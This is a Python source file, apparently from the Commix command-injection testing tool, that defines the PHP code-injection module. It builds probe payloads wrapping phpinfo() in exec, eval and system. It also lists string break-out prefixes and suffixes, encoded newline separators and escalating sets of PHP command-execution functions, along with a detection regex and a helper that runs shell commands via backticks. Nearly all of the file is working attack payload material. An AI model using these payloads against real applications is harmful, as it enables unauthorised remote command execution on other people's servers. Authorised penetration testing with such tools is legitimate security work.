#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "php"

# A call whose output says at once that code was evaluated, and which version evaluated it.
PROBE = "phpinfo()"

# The probe on its own, and wrapped in the functions that would run it where a bare call is not
# evaluated - each is tried until one of them answers.
PROBE_FUNCTIONS = ["" + PROBE + "",
  "exec(" + PROBE + ")",
  "eval(" + PROBE + ")",
  "system(" + PROBE + ")"
]

# The same probes broken into the string being evaluated, one boundary per row.
PROBE_PAYLOADS = [
  [".print(" + x + ")" for x in PROBE_FUNCTIONS],
  [")'}" + x + "'#" for x in PROBE_FUNCTIONS],
  ["'." + x + ".'" for x in PROBE_FUNCTIONS],
  ["{${" + x + "}}" for x in PROBE_FUNCTIONS],
  ["\\\\/{${" + x + "}}\\/\\" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

# What the probe's own output looks like coming back, and the interpreter's complaints that say a
# payload reached an evaluated string even where nothing was printed.
PROBE_REGEX = r"PHP Version </td><td class=\"v\">(([\w\.]+))"
WARNINGS = ["eval()'d code", "runtime-created function", "usort()", "assert()", "preg_replace()"]

# The language's own functions that run a command, widest first as the level rises.
EXECUTION_FUNCTIONS_LVL1 = ["exec"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["system", "shell_exec"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["passthru", "proc_open", "popen"]

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["%0a"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["%0d%0a"]

PREFIXES_LVL1 = [".", "'.", "{${"]
PREFIXES_LVL2 = PREFIXES_LVL1 + [")'}", "');}"]
PREFIXES_LVL3 = PREFIXES_LVL2 + ["\".", "')", "\")", ");}", "\");}", ")", ";", "'", ""]

SUFFIXES_LVL1 = [ "",  ".'", "}}"]
SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["'#"]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + [".\"", "\\\\", "//", ")}", "#"]

"""
Wrap the shell commands a payload runs in this language's print statement.

Every command has to leave its output on a line of its own: the results are read back as marker,
output and marker separated by newlines, so anything printed without one runs into the next marker.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return "print(" + ".".join("`" + command + "`" for command in commands) + ")"
  return "print(`" + (chain or separator).join(commands) + "`)%3B"

# eof
